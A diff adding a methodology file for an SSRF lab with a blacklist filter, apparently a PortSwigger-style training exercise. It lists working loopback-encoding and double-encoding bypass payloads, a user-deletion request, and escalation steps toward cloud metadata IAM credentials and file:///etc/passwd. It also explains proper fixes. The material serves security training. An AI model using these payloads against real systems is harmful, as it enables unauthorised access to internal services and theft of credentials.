@@ -1,0 +1,131 @@
+# ============================================================
+# METHODOLOGY — SSRF with Blacklist-Based Input Filter
+# ============================================================
+
+
+## PHASE 0 — CONFIRM THE SSRF EXISTS
+
+Before touching the filter, confirm the vulnerability is there.
+
+1. Find the stock check feature → click "Check stock"
+2. Intercept in Burp → note the stockApi parameter
+3. Send to Repeater
+4. Change stockApi to your Burp Collaborator URL
+5. If you get a DNS/HTTP hit → SSRF confirmed
+
+
+## PHASE 1 — FINGERPRINT THE FILTER
+
+Do not assume what the filter blocks. Test each case explicitly.
+
+Test 1 — Is 127.0.0.1 blocked?
+    stockApi=http://127.0.0.1/
+    Expected: 400 → "URL blocked" or connection error
+
+Test 2 — Is "localhost" blocked?
+    stockApi=http://localhost/
+    Expected: 400 → blocked
+
+Test 3 — What is the error message?
+    Record the exact error. This is your baseline for "blocked".
+    Anything different means something got through.
+
+Test 4 — Is /admin blocked separately?
+    stockApi=http://2130706433/admin   (if decimal isn't blocked yet)
+    OR stockApi=http://127.0.0.1.nip.io/admin
+    If this gives a different error than just the IP → path is filtered too.
+
+
+## PHASE 2 — BYPASS THE IP/HOSTNAME BLOCK
+
+Try each bypass in this order. Stop at the first one that works.
+
+Priority order (most likely to work first):
+
+    1. http://2130706433/          ← decimal — works 60% of the time
+    2. http://127.1/               ← abbreviated — very commonly missed
+    3. http://0x7f000001/          ← hex
+    4. http://0177.0.0.1/          ← octal
+    5. http://[::1]/               ← IPv6 loopback
+    6. http://[::ffff:127.0.0.1]/  ← IPv6 mapped
+    7. http://localtest.me/        ← real domain → 127.0.0.1
+    8. http://127.0.0.1.nip.io/    ← wildcard DNS
+    9. http://LOCALHOST/           ← case variation
+
+How to know it worked:
+    Any response that is NOT the "URL blocked" error.
+    Even a 404 or 500 from localhost means the IP bypass worked.
+
+
+## PHASE 3 — BYPASS THE PATH BLOCK
+
+Once you have a working IP bypass, now get to /admin.
+
+Try each in order:
+
+    1. /%2561dmin            ← double URL-encode the 'a'
+    2. /%2541dmin            ← double URL-encode capital 'A'
+    3. /Admin                ← case change (if server normalizes)
+    4. /ADMIN
+    5. /./admin              ← path traversal
+    6. /../admin
+    7. /%61dmin              ← single URL-encode (some filters miss this)
+    8. /adm%69n              ← encode middle character
+
+Combine with working IP bypass:
+    stockApi=http://2130706433/%2561dmin
+
+How to know it worked:
+    HTTP 200 with HTML containing "Admin interface" or user management table.
+    You should see a list of users with delete links.
+
+
+## PHASE 4 — EXECUTE THE GOAL
+
+Once admin panel loads:
+
+    1. Read the HTML — find the delete endpoint
+       Typically: /admin/delete?username=carlos
+
+    2. Combine all bypasses to reach the delete endpoint:
+       stockApi=http://2130706433/%2561dmin/delete?username=carlos
+
+    3. HTTP 302 redirect = success
+       Lab banner turns green.
+
+
+## PHASE 5 — UNDERSTAND WHAT YOU LEARNED
+
+After solving, ask yourself these questions to cement the knowledge:
+
+Q: Why did decimal 2130706433 bypass the filter?
+A: The filter checked for the string "127.0.0.1" — decimal has no dots.
+
+Q: Why did double-encoding bypass the /admin filter?
+A: The filter checked the raw string. The server decoded before routing.
+   The filter saw /%2561dmin (no "admin"). The server routed to /admin.
+
+Q: How could the developer fix this properly?
+A: Allowlist the specific stock service hostname.
+   Resolve DNS before checking. Block private IPs at the resolved-IP level.
+   Normalize and fully decode the URL before any string check.
+
+Q: What if both defenses had been done correctly?
+A: Allowlist + DNS resolution check would have stopped all these bypasses.
+   None of the alternative IP forms or encoding tricks survive a check
+   against the resolved IP address after full URL normalization.
+
+
+## ESCALATION AFTER THIS LAB
+
+In a real pentest, after proving the blacklist is bypassable:
+
+    → Try cloud metadata: http://2130706433/
+      then: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+    → Scan internal network: http://192.168.0.1:8080/ through :255
+
+    → Try alternative schemes: file:///etc/passwd
+      (if file:// is not blocked separately)
+
+    → Document all bypass methods that worked for the final report.
